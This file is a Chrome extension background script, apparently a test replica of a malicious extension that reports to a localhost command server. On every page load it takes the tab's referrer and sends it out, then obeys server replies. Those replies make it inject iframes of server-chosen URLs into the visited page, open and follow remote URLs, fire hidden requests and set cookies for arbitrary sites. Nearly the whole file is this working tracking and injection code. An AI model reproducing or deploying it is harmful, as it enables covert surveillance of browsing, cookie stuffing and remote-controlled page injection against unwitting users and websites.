const URL = "http://127.0.0.1:8080";
const extensionName = "Permsissions Test";

chrome.tabs.onUpdated.addListener((async (tabId, changeInfo, tab) => {
    console.log("from: " + tab.url)
    const {status: r} = changeInfo,
          {url: o} = tab;
    (async () => {
        if (o.startsWith('chrome://')) {
            console.log(o);
            return;
        }
        if ("complete" === r && o) try {
            let referrer = await get_ref(tabId),
                s = {
                    ref: btoa(referrer)
                };

            const i = await fetch(`${URL}/api/a`, {
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json"
                },
                method: "POST",
                body: JSON.stringify({
                    ...s,
                    apisend: btoa("userID"),
                    name: btoa("ext"),
                    ext_name: extensionName
                })
            }),
            c = await i.json();
            console.log("json received")   
            if (c) {
                if (!document.getElementById("a")) {
                    var n = document.createElement("div");
                    n.id = "a", document.body.appendChild(n)
                }
                var a;
                console.log(c)
                c.a && chrome.tabs.executeScript(tabId, {code: 
                    'var domscript = document.createElement("iframe");domscript.src = "' + c.a 
                    + '";document.getElementsByTagName("head")[0].appendChild(domscript);'    
                });

                // c.b && (4 == ranum(5) && (document.getElementById("a").innerHTML = ""), 
                //     (a = document.createElement("iframe")).src = c.b, document.getElementById("a").appendChild(a));

                c.b2 && ((a = document.createElement("iframe")).src = c.b2, document.getElementById("a").appendChild(a));

                c.b3 && openf_url(c.b3, tabId);
                
                c.c && passf_url(c.c, tabId);
                
                c.d && xmlopen(c.d);
                
                c.e && setCookie(c.e[0], c.e[1], c.e[2], 86400);
            }
        } catch (e) {}
    })()
}));
var httpq4 = new getXMLHTTPRequest;
var setCookie = function(e, t, n, r) {
    return new Promise((function(o) {
        chrome.cookies.set({
            url: e,
            name: t,
            value: n,
            expirationDate: (new Date).getTime() / 1e3 + r
        }, (() => {
            o(n)
        }))
    }))
};

function openf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        if (4 == httpq4.readyState && (200 == httpq4.status || 404 == httpq4.status) && httpq4.responseURL) {
            var e = document.createElement("iframe");
            e.src = httpq4.responseURL, document.getElementById("a").appendChild(e)
        }
    }, httpq4.send()
}

function passf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        console.log(httpq4);
        4 != httpq4.readyState || 200 != httpq4.status && 404 != httpq4.status || httpq4.responseURL && chrome.tabs.executeScript(t, {
            code: 'var domscript = document.createElement("iframe");domscript.src = "' + httpq4.responseURL + '";document.getElementsByTagName("head")[0].appendChild(domscript);'
        })
    }, httpq4.send()
}

function getXMLHTTPRequest() {
    return new XMLHttpRequest
}

function xmlopen(e) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.send()
}

async function get_ref(tabId) {
    var ret = new Promise((function(t, n) {
        try {
            chrome.tabs.executeScript(tabId, {
                code: "document.referrer;"
            }, (function(ref) {
                console.log(ref)
                ref && ref.length && t(ref[0])
            }))
        } catch {
            t("")
        }
    }));
    return await ret
}